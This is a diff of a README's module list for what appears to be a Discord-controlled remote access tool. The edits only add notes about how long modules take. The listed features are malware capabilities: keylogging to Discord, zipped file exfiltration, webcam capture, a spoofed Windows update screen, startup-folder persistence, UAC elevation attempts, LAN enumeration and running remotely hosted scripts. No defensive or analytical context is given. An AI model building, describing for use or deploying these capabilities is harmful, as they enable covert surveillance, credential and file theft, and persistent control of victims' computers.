@@ -30,8 +30,8 @@ Every 10 seconds it will check a file for a change in the file contents and inte
 3. `Keycapture`   : Capture Keystrokes and send to Discord. (see ExtraInfo for usage.)          
 4. `Exfiltrate` : Send various files to Discord zipped in 25mb files. (see ExtraInfo for usage.)                   
 5. `Upload` : Upload a file to Discord. (see ExtraInfo for usage.)     
-6. `Systeminfo` : Send System information as text file to Discord.          
-7. `TakePicture` : Send a webcam picture to Discord.                 
+6. `Systeminfo` : Send System information as text file to Discord. (takes a few minutes to gather data)         
+7. `TakePicture` : Send a webcam picture to Discord. (can take a few minutes..)
 8. `FolderTree` : Save folder trees to file and send to Discord.
 9. `FakeUpdate` : Spoof windows update screen.            
 10. `AddPersistance` : Add this script to the startup folder.         
@@ -39,7 +39,7 @@ Every 10 seconds it will check a file for a change in the file contents and inte
 12. `CustomCommand` : Execute a hosted text file as a script. 
 13. `IsAdmin`  : Check if the session is admin.             
 14. `AttemptElevate` : Attempt to restart script as admin. (displays a UAC prompt to User)  
-15. `EnumerateLAN`  : Show all devices on the network (see ExtraInfo for usage.)     
+15. `EnumerateLAN`  : Show all devices on the network (see ExtraInfo for usage.) (can take a few miniutes to complete)    
 16. `Close`  : Close this Session                          
 17. `Options`  : Show the Module menu
 18. `ExtraInfo`  : Show extra Module information
